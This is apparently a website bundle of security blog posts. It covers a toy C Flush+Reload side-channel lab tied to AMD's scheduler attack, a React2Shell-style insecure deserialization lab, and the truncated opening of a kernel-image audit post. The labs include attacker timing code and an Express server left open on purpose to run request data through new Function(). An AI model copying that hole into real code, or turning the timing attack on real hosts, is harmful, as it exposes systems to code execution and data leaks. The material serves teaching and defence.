<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> {
    <span class="pl-smi">uint8_t</span> <span class="pl-c1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">stop</span>;      <span class="pl-c">// flag to tell victim to stop</span>
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">ready</span>;     <span class="pl-c">// flag for simple sync</span>
};</pre></div>
<p><strong>Victim process:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// victim.c</span>
<span class="pl-c">// gcc -O2 -march=native -o victim victim.c -lrt</span>

<span class="pl-k">#include</span> <span class="pl-s">"common.h"</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;sys/mman.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;fcntl.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>

<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x7F</span>;

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-smi">int</span> <span class="pl-s1">fd</span> <span class="pl-c1">=</span> <span class="pl-en">shm_open</span>(<span class="pl-s">"/tsa_demo"</span>, <span class="pl-c1">O_RDWR</span> | <span class="pl-c1">O_CREAT</span>, <span class="pl-c1">0600</span>);
    <span class="pl-en">ftruncate</span>(<span class="pl-s1">fd</span>, <span class="pl-k">sizeof</span>(<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span>));
    <span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span> <span class="pl-c1">=</span> <span class="pl-en">mmap</span>(<span class="pl-c1">NULL</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">*</span><span class="pl-s1">sh</span>),
                                    <span class="pl-c1">PROT_READ</span> | <span class="pl-c1">PROT_WRITE</span>,
                                    <span class="pl-c1">MAP_SHARED</span>, <span class="pl-s1">fd</span>, <span class="pl-c1">0</span>);

    <span class="pl-c">// Initialize</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">ready</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span>;

    <span class="pl-k">while</span> (!<span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">stop</span>) {
        <span class="pl-c">// attacker_hint could be communicated via shared memory too;</span>
        <span class="pl-c">// here we just fix it for simplicity</span>
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x11</span>;
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;
        <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;
        __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
    }

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p><strong>Attacker process:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// attacker.c</span>
<span class="pl-c">// gcc -O2 -march=native -o attacker attacker.c -lrt</span>

<span class="pl-k">#include</span> <span class="pl-s">"common.h"</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;sys/mman.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;fcntl.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-smi">uint32_t</span> <span class="pl-en">time_access</span>(<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span>, <span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-smi">unsigned</span> <span class="pl-s1">aux</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    <span class="pl-k">return</span> (<span class="pl-smi">uint32_t</span>)(<span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>);
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-smi">int</span> <span class="pl-s1">fd</span> <span class="pl-c1">=</span> <span class="pl-en">shm_open</span>(<span class="pl-s">"/tsa_demo"</span>, <span class="pl-c1">O_RDWR</span>, <span class="pl-c1">0600</span>);
    <span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span> <span class="pl-c1">=</span> <span class="pl-en">mmap</span>(<span class="pl-c1">NULL</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">*</span><span class="pl-s1">sh</span>),
                                    <span class="pl-c1">PROT_READ</span> | <span class="pl-c1">PROT_WRITE</span>,
                                    <span class="pl-c1">MAP_SHARED</span>, <span class="pl-s1">fd</span>, <span class="pl-c1">0</span>);

    <span class="pl-c">// Wait for victim to init</span>
    <span class="pl-k">while</span> (!<span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">ready</span>) { }

    <span class="pl-c">// Flush cache lines first</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }

    <span class="pl-c">// Give victim some time to run and "prime" one line</span>
    <span class="pl-en">usleep</span>(<span class="pl-c1">10000</span>);

    <span class="pl-smi">uint32_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint32_t</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-en">time_access</span>(<span class="pl-s1">sh</span>, <span class="pl-s1">idx</span>);
        <span class="pl-k">if</span> (<span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">t</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index (cross-proc) = %d, time = %u cycles\\n"</span>,
           <span class="pl-s1">best_idx</span>, <span class="pl-s1">best_time</span>);

    <span class="pl-c">// Tell victim to stop</span>
    <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">stop</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span>;

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>This is closer in spirit to <strong>“victim in one context, attacker in another”</strong>, even though they’re still on the same OS and sharing memory explicitly. Real TSA removes that explicit sharing: instead of a shared array, the “shared state” is the CPU’s internal scheduler, store queue, and L1 cache.</p>
<div class="markdown-heading"><h3 class="heading-element">4.4 Connecting the lab back to TSA</h3><a id="user-content-44-connecting-the-lab-back-to-tsa" class="anchor" aria-label="Permalink: 4.4 Connecting the lab back to TSA" href="#44-connecting-the-lab-back-to-tsa"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Right after these code sections, the key takeaway is:</p>
<ul>
<li>
<p>Our toy lab uses <strong>cache presence</strong> as the side-channel signal (classic Flush+Reload / Prime+Probe).</p>
</li>
<li>
<p>TSA uses <strong>scheduler timing</strong> as the side-channel signal:</p>
<ul>
<li>False completions → invalid data forwarded → different dependency chains → different timing.</li>
</ul>
</li>
<li>
<p>In both cases, the attacker:</p>
<ol>
<li>
<strong>Influences</strong> microarchitectural state (priming),</li>
<li>Lets a victim touch secret-dependent data (access pattern),</li>
<li>Measures a <strong>timing difference</strong> in its own code,</li>
<li>Reconstructs bits of the secret over many trials.</li>
</ol>
</li>
</ul>
<p>That’s the mental bridge you want readers to cross.</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">5. Mitigations: what AMD, OSs, and clouds are doing</h2><a id="user-content-5-mitigations-what-amd-oss-and-clouds-are-doing" class="anchor" aria-label="Permalink: 5. Mitigations: what AMD, OSs, and clouds are doing" href="#5-mitigations-what-amd-oss-and-clouds-are-doing"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>TSA mitigations span firmware, OS, and virtualization layers.</p>
<div class="markdown-heading"><h3 class="heading-element">5.1 Microcode + VERW</h3><a id="user-content-51-microcode--verw" class="anchor" aria-label="Permalink: 5.1 Microcode + VERW" href="#51-microcode--verw"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD ships updated <strong>microcode</strong> for vulnerable Family 19h CPUs. On top of that, they recommend using the memory form of the <code>VERW</code> instruction as a “microarchitectural scrub”:</p>
<ul>
<li>New CPUID bits tell software:
<ul>
<li>Whether TSA-L1 / TSA-SQ are not present,</li>
<li>Whether the CPU supports TSA mitigation via <code>VERW_CLEAR</code>.</li>
</ul>
</li>
<li>With appropriate microcode loaded, <strong>CPL0 (kernel / hypervisor)</strong> can execute <code>VERW</code> to clear TSA-relevant structures when crossing trust boundaries, e.g.:
<ul>
<li>Kernel → user transitions,</li>
<li>Hypervisor → guest VM transitions,</li>
<li>Before entering low-power states.</li>
</ul>
</li>
</ul>
<p>This is similar in spirit to existing post-Spectre mitigations (IBPB, STIBP, etc.) but targeted at scheduler structures.</p>
<div class="markdown-heading"><h3 class="heading-element">5.2 Linux <code>MITIGATION_TSA</code> and <code>tsa=</code> knob</h3><a id="user-content-52-linux-mitigation_tsa-and-tsa-knob" class="anchor" aria-label="Permalink: 5.2 Linux MITIGATION_TSA and tsa= knob" href="#52-linux-mitigation_tsa-and-tsa-knob"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Linux added explicit support for TSA mitigations:</p>
<ul>
<li>A new Kconfig option <code>MITIGATION_TSA</code> gates TSA-related logic.</li>
<li>A boot parameter <code>tsa=</code> controls behavior (e.g., always on, only for user/kernel transitions, only guest/host transitions, or disabled).</li>
<li>Combined with updated microcode from <code>linux-firmware</code>, this lets distros tune performance vs security trade-offs depending on threat model.</li>
</ul>
<div class="markdown-heading"><h3 class="heading-element">5.3 SEV-SNP and attestation</h3><a id="user-content-53-sev-snp-and-attestation" class="anchor" aria-label="Permalink: 5.3 SEV-SNP and attestation" href="#53-sev-snp-and-attestation"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>For AMD’s <strong>SEV-SNP</strong> (encrypted VM) environments:</p>
<ul>
<li>TSA could, in principle, allow a malicious hypervisor to infer SEV-SNP guest data.</li>
<li>Microcode and firmware updates aim to automatically mitigate TSA for SEV-SNP guests.</li>
<li>Guest owners are expected to:
<ul>
<li>Verify via <strong>attestation</strong> that the host is running the right microcode,</li>
<li>Confirm that TSA mitigations are active before trusting the platform.</li>
</ul>
</li>
</ul>
<hr>
<div class="markdown-heading"><h2 class="heading-element">6. What red teams and blue teams should actually do</h2><a id="user-content-6-what-red-teams-and-blue-teams-should-actually-do" class="anchor" aria-label="Permalink: 6. What red teams and blue teams should actually do" href="#6-what-red-teams-and-blue-teams-should-actually-do"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<div class="markdown-heading"><h3 class="heading-element">6.1 For red teams</h3><a id="user-content-61-for-red-teams" class="anchor" aria-label="Permalink: 6.1 For red teams" href="#61-for-red-teams"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>TSA probably won’t be your <strong>first</strong> move in a real engagement, but it’s worth understanding as part of a modern attack surface:</p>
<ul>
<li>
<strong>Model it as a capability</strong>:
<ul>
<li>“Given local code execution on a shared AMD Zen 3/4 host, I may be able to leak bits of privileged data over time.”</li>
</ul>
</li>
<li>
<strong>Think in campaigns, not single shots</strong>:
<ul>
<li>Meeting the timing conditions and noise requirements means you want long-lived footholds and repeated victim activity.</li>
</ul>
</li>
<li>
<strong>Use it to stress test cloud models</strong>:
<ul>
<li>Ask: “If I’m a rogue tenant on this EPYC host, what’s the maximum <em>theoretical</em> data I can extract from neighbors?”</li>
</ul>
</li>
</ul>
<p>TSA is a great hook for talks and blogs because it forces teams to think beyond “network perimeter” and even beyond “syscall boundary.” The CPU itself is part of the threat surface.</p>
<div class="markdown-heading"><h3 class="heading-element">6.2 For blue teams</h3><a id="user-content-62-for-blue-teams" class="anchor" aria-label="Permalink: 6.2 For blue teams" href="#62-for-blue-teams"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Concrete actions:</p>
<ol>
<li>
<p><strong>Patch like this is Meltdown-class, not just ‘medium CVSS’</strong></p>
<ul>
<li>Make sure:
<ul>
<li>Firmware/microcode is up to date for all Family 19h platforms,</li>
<li>OS / hypervisor builds include TSA mitigations and have <code>tsa=</code> configured appropriately.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Re-evaluate your multi-tenant risk</strong></p>
<ul>
<li>In clouds and shared hosting:
<ul>
<li>Understand which SKUs are affected,</li>
<li>Decide whether you treat TSA as an academic curiosity or something you must mitigate for specific tenants (e.g., high-sensitivity workloads).</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Include TSA in your threat modeling</strong></p>
<ul>
<li>It’s an <strong>info-leak primitive</strong>, not an RCE.</li>
<li>Combine it mentally with other bugs:
<ul>
<li>RCE → TSA → secret exfiltration → crypto break → lateral movement.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Watch for performance regressions</strong></p>
<ul>
<li>VERW-based mitigations may hurt performance; you’ll need to benchmark and possibly make different choices per environment (internal dev vs multi-tenant cloud vs regulated workloads).</li>
</ul>
</li>
</ol>
<hr>
`,Kg=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server</h1>
    <blockquote>
      <p>"Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation." — OWASP</p>
    </blockquote>
    <p>CVE-2025-55182 ("React2Shell") pushed insecure deserialization back into the spotlight:</p>
    <ul>
      <li>It’s a CVSS 10.0 RCE in <strong>React Server Components</strong> (RSC).</li>
      <li>The bug lives in the <strong>Flight protocol</strong> used by RSC: attacker-controlled data is <strong>deserialized unsafely</strong>, letting crafted objects influence server-side execution and achieve code execution on the Node.js server.</li>
    </ul>
    <p>You absolutely shouldn’t be testing real React2Shell payloads against anything but an isolated lab. But you <em>can</em> understand the core pattern with a <strong>tiny, self-contained Node.js example</strong> that mimics the same <em>class</em> of bug: deserialization of untrusted data → treating it as special internal objects → executing attacker-controlled behavior.</p>
    <p>This post walks through:</p>
    <ul>
      <li>A quick refresher on insecure deserialization.</li>
      <li>A <strong>toy "fake Flight" server</strong> in Node/Express that’s intentionally vulnerable.</li>
      <li>A harmless "payload" that only evaluates math.</li>
      <li>A safer version of the same endpoint.</li>
      <li>How this maps conceptually to real-world bugs like React2Shell.</li>
    </ul>
    <hr />
    <h2>1. Insecure deserialization in one paragraph</h2>
    <p>Insecure deserialization is when an application takes <strong>untrusted data</strong>, deserializes it into objects, and then uses those objects in ways that let an attacker:</p>
    <ul>
      <li>Manipulate logic,</li>
      <li>Abuse "magic" methods or callbacks,</li>
      <li>Or even <strong>execute arbitrary code</strong>.</li>
    </ul>
    <p>That’s why it shows up in the OWASP Top 10 and is treated as a high-risk category: unsafe deserialization logic can be a straight path to RCE.</p>
    <p>React2Shell is a modern instance of this: the server <strong>deserializes Flight payloads</strong> and interprets them as internal “Chunk” objects. Because that deserialization didn’t sufficiently validate or constrain what those objects could look like, attackers found a way to make React resolve <em>fake</em> chunks and end up running arbitrary JavaScript on the server.</p>
    <p>Let’s recreate that <em>pattern</em> in a tiny Node app.</p>
    <hr />
    <h2>2. A tiny "fake Flight" server (intentionally vulnerable)</h2>
    <p>We’ll build a Node/Express server that:</p>
    <ul>
      <li>Accepts a JSON payload that looks like a "slot map" (<code>"0"</code>, <code>"1"</code>, etc.).</li>
      <li>Pulls out slot <code>"1"</code> as a <strong>"chunk"</strong>.</li>
      <li>Treats any chunk with a <code>then</code> field as special.</li>
      <li>Calls a handler based on <code>chunk.then</code>.</li>
      <li>Uses <code>chunk._expr</code> inside <code>new Function()</code>.</li>
    </ul>
    <p>This is obviously unsafe; that’s the point. It’s a simplified version of the larger deserialization &amp; "thenable" handling patterns described in real-world React2Shell writeups.</p>
    <h3>2.1 Setup</h3>
    <pre><code class="language-bash">mkdir fake-flight-lab
cd fake-flight-lab
npm init -y
npm install express body-parser</code></pre>
    <h3>2.2 Vulnerable server (<code>server-vuln.js</code>)</h3>
    <pre><code class="language-javascript">const express = require("express");
const bodyParser = require("body-parser");

const app = express();
app.use(bodyParser.json());

// --- Fake "chunk" resolver (vulnerable) ---

// Very naive "promise-like" resolver: if an object has a \`then\` field,
// we treat it as something that needs to be "resolved" via a handler.
const thenHandlers = {
  // Our "legit" handler; mapping is attacker-controllable in this toy
  logAndEval: function (chunk, response) {
    console.log("[*] logAndEval called with chunk:", chunk);

    // Attacker-controlled field:
    const expr = chunk._expr;

    // VULNERABLE: directly compile and run attacker-controlled string.
    // In real bugs, this might be an internal expression or dynamic call.
    const fn = new Function(\`return (\${expr});\`);

    const result = fn();
    response.value = result;
  },
};

// Fake "Flight" endpoint
app.post("/fake-flight", (req, res) => {
  const payload = req.body;

  console.log("[*] Received payload:", JSON.stringify(payload, null, 2));

  // Pick slot "1" as our main "chunk"
  const chunk = payload["1"];
  const response = { value: null };

  try {
    // VULN #1: trust that whatever is in \`chunk.then\` is a valid handler name
    const handlerName = chunk.then;

    // VULN #2: look it up dynamically without validation
    const handler = thenHandlers[handlerName];

    if (typeof handler !== "function") {
      throw new Error("No such handler");
    }

    // Call the handler with the (attacker-controlled) chunk
    handler(chunk, response);

    // Serialize the result
    res.json({
      ok: true,
      result: response.value,
    });
  } catch (e) {
    console.error("[!] Error while processing fake-flight payload:", e);
    res.status(500).json({ ok: false, error: e.message });
  }
});

app.listen(3000, () => {
  console.log("VULN fake-flight server listening on http://localhost:3000");
});</code></pre>
    <p>What’s insecure here:</p>
    <ul>
      <li>We treat any object with <code>.then</code> as special and use that field to <strong>control which function runs</strong>.</li>
      <li>We take a string from <code>_expr</code> and feed it straight into <code>new Function</code> → arbitrary code path inside the Node process. This mirrors how insecure deserialization can escalate into code execution in real apps.</li>
    </ul>
    <hr />
    <h2>3. A harmless "malicious" payload (just math)</h2>
    <p>Start the server:</p>
    <pre><code class="language-bash">node server-vuln.js</code></pre>
    <p>Now send a JSON payload that looks suspiciously like a "chunk":</p>
    <pre><code class="language-bash">curl -X POST http://localhost:3000/fake-flight   -H "Content-Type: application/json"   -d '{
    "0": "meta",
    "1": {
      "status": "resolved_model",
      "_expr": "1 + 2 + 3 * 4",
      "then": "logAndEval"
    }
  }'</code></pre>
    <p>What happens:</p>
    <ol>
      <li>The server reads <code>payload["1"]</code> into <code>chunk</code>.</li>
      <li>It sees <code>chunk.then === "logAndEval"</code> and calls <code>thenHandlers.logAndEval(chunk, response)</code>.</li>
      <li><code>logAndEval</code> pulls <code>chunk._expr</code> (<code>"1 + 2 + 3 * 4"</code>).</li>
      <li>It builds <code>new Function("return (" + expr + ");")</code> → <code>new Function("return (1 + 2 + 3 * 4);")</code>.</li>
      <li>Executes it and returns:</li>
    </ol>
    <pre><code class="language-json">{
  "ok": true,
  "result": 15
}</code></pre>
    <p>This is benign — we only evaluated a math expression — but structurally we’ve reproduced the core pattern:</p>
    <ul>
      <li><strong>Attacker controls object fields</strong> (<code>then</code>, <code>_expr</code>) in the deserialized payload.</li>
      <li>The server uses those fields to <strong>drive control flow</strong> (which handler to run) and <strong>compose code to execute</strong>.</li>
    </ul>
    <p>That’s exactly the kind of chain OWASP warns about: untrusted data being deserialized and then used to manipulate object attributes or insert new ones, leading to logic abuse or code execution.</p>
    <hr />
    <h2>4. Fixing the toy: structured data, no <code>new Function</code></h2>
    <p>Now let’s add a <strong>safe</strong> variant of the same endpoint, so you can see what “good” looks like in contrast.</p>
    <h3>4.1 Safer handler</h3>
    <p>Add this to the same file (or a new one):</p>
    <pre><code class="language-javascript">// --- Safer variant: explicit, whitelisted operations only ---

const SAFE_OPS = new Set(["add", "mul"]);

function safeEvalExpression(op, a, b) {
  if (!SAFE_OPS.has(op)) {
    throw new Error("Unsupported op");
  }
  a = Number(a);
  b = Number(b);
  if (Number.isNaN(a) || Number.isNaN(b)) {
    throw new Error("Invalid numbers");
  }
  return op === "add" ? a + b : a * b;
}

app.post("/fake-flight-safe", (req, res) => {
  const payload = req.body;
  const chunk = payload["1"];
  const response = { value: null };

  try {
    // Validate structure explicitly
    if (!chunk || chunk.status !== "resolved_model") {
      throw new Error("bad status");
    }

    const { op, a, b } = chunk;

    const result = safeEvalExpression(op, a, b);
    response.value = result;

    res.json({ ok: true, result: response.value });
  } catch (e) {
    console.error("[!] Error in safe endpoint:", e);
    res.status(400).json({ ok: false, error: e.message });
  }
});</code></pre>
    <p>Now call:</p>
    <pre><code class="language-bash">curl -X POST http://localhost:3000/fake-flight-safe   -H "Content-Type: application/json"   -d '{
    "1": {
      "status": "resolved_model",
      "op": "add",
      "a": 10,
      "b": 20
    }
  }'</code></pre>
    <p>You should see:</p>
    <pre><code class="language-json">{
  "ok": true,
  "result": 30
}</code></pre>
    <p>Here we:</p>
    <ul>
      <li><strong>Don’t</strong> treat <code>then</code> as a magic field.</li>
      <li><strong>Don’t</strong> run arbitrary expressions.</li>
      <li><strong>Do</strong>:
        <ul>
          <li>Validate fields,</li>
          <li>Constrain operations to a whitelist,</li>
          <li>Coerce types.</li>
        </ul>
      </li>
    </ul>
    <p>This matches common guidance on safe deserialization: define a strict schema, validate all fields, and never deserialize directly into objects with behavior (callbacks, dynamic code) that can be triggered by untrusted data.</p>
    <hr />
    <h2>5. Mapping this toy back to React2Shell</h2>
    <p>Real-world CVE-2025-55182 is obviously more complex, but the <em>shape</em> of the bug is similar:</p>
    <ul>
      <li>RSC has a <strong>Flight protocol</strong> with a structured payload (slots, references, status codes).</li>
      <li>The server <strong>deserializes</strong> that payload into internal “Chunks”.</li>
      <li>Those chunks are treated like promise-like objects and resolved using their <code>then</code> and related fields.</li>
      <li>Because the code did not sufficiently validate or lock down the structure, <strong>attacker-supplied objects</strong> can be interpreted as internal chunks, and their fields end up influencing internal callbacks and state — eventually leading to arbitrary JS execution in the Node process.</li>
    </ul>
    <p>Security writeups on React2Shell repeatedly describe it as an <strong>unsafe / insecure deserialization flaw in the Flight protocol</strong>: untrusted data, parsed into internal structures, used to control resolution logic and server-side behavior.</p>
    <p>This toy example gives you a mental model to read those writeups:</p>
    <ul>
      <li>Anywhere you see “fake Chunk objects”, think: <em>our <code>chunk</code> object with attacker-controlled fields</em>.</li>
      <li>Anywhere you see “thenable abused”, think: <em>our <code>chunk.then</code> controlling which function runs</em>.</li>
      <li>Anywhere you see “code injected into internal expression”, think: <em>our <code>_expr</code> string passed into <code>new Function()</code></em>.</li>
    </ul>
    <hr />
    <h2>6. Takeaways for your own code</h2>
    <p>Whether or not you ever touch React Server Components, this pattern shows up everywhere:</p>
    <ul>
      <li>JSON / binary payloads mapped into "magic" objects.</li>
      <li>ORMs or serializers that hydrate classes with methods and hooks.</li>
      <li>Message formats that allow callbacks or special fields (<code>__proto__</code>, <code>then</code>, <code>_onLoad</code>, etc.).</li>
    </ul>
    <p>To avoid ending up in the same situation:</p>
    <ol>
      <li><strong>Don’t deserialize untrusted data into rich objects with behavior.</strong><br />Deserialize into plain data structures and validate them first.</li>
      <li><strong>Treat protocol fields like code, not just data.</strong><br />Anything that controls which function gets called (<code>then</code>, <code>type</code>, <code>handler</code>) needs strict allowlists.</li>
      <li><strong>Never <code>eval</code> / <code>new Function</code> on data from the network.</strong><br />If you really must interpret expressions, constrain them to a safe DSL and sandbox heavily.</li>
      <li><strong>For complex protocols (like Flight), write fuzzers and negative tests.</strong><br />When you see a deserializer that:
        <ul>
          <li>Builds graphs of objects,</li>
          <li>Treats some fields specially,</li>
          <li>Traverses prototypes / thenables…<br />…that’s a huge red flag and deserves targeted testing.</li>
        </ul>
      </li>
    </ol>
  </div>
</body>
</html>
`,Qg=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>Who Can Touch Your Kernel? Auditing <code>/boot/vmlinuz-*</code> on Linux</h1>
    <p>When we talk about “protecting a Linux system,” most people think of:</p>
    <ul>
      <li>Patching services</li>
      <li>Hardening SSH</li>
      <li>Watching logs</li>
    </ul>
    <p>Almost nobody starts with the question:</p>
    <blockquote>
      <p><strong>“Who can modify my kernel image?”</strong></p>
    </blockquote>
    <p>On a typical Linux machine, that kernel image lives in files like:</p>
    <pre><code class="language-bash">/boot/vmlinuz-6.8.0-35-generic
/boot/vmlinuz-5.15.0-91-generic</code></pre>
    <p>These are not just random binaries. They <em>are</em> the operating system’s core. If an attacker can silently replace them, everything above the kernel—processes, containers, even security tools—runs on top of a compromised foundation.</p>
    <p>In this post, we’ll explore:</p>
    <ul>
      <li>What <code>/boot/vmlinuz-*</code> actually is</li>
      <li>Which code <strong>must</strong> be allowed to modify it</li>
      <li>Which code <strong>shouldn’t</strong> but still technically can</li>
      <li>How to start <strong>detecting risky conditions</strong> with a detailed Python audit script</li>
    </ul>
    <p>All from a defensive, “threat-model my own box” point of view.</p>
    <hr />
    <h2>1. What lives in <code>/boot/vmlinuz-*</code>?</h2>
    <p>On most distros, you’ll see files like:</p>
    <pre><code class="language-bash">ls -l /boot/vmlinuz-*
-rw------- 1 root root 12345678 May  1 10:00 /boot/vmlinuz-6.8.0-35-generic
-rw------- 1 root root 11765432 Mar 10 09:21 /boot/vmlinuz-5.15.0-91-generic</code></pre>
    <p>Those <code>vmlinuz-*</code> files are:</p>
    <ul>
      <li>The <strong>compressed Linux kernel images</strong></li>
      <li>Loaded by the bootloader (GRUB, systemd-boot, etc.) at boot</li>
      <li>Executed in <strong>ring 0</strong>, the most privileged CPU mode</li>
    </ul>
    <p>During boot:</p>
    <ol>
      <li>Firmware (BIOS/UEFI) loads the bootloader.</li>
      <li>Bootloader reads <code>/boot/vmlinuz-&lt;version&gt;</code> and an initramfs from disk.</li>
      <li>It hands control to the kernel.</li>
      <li>The kernel decompresses itself and starts the OS.</li>
    </ol>
    <p>If an attacker can replace this image with a modified one, they don’t just “have root”—they can:</p>
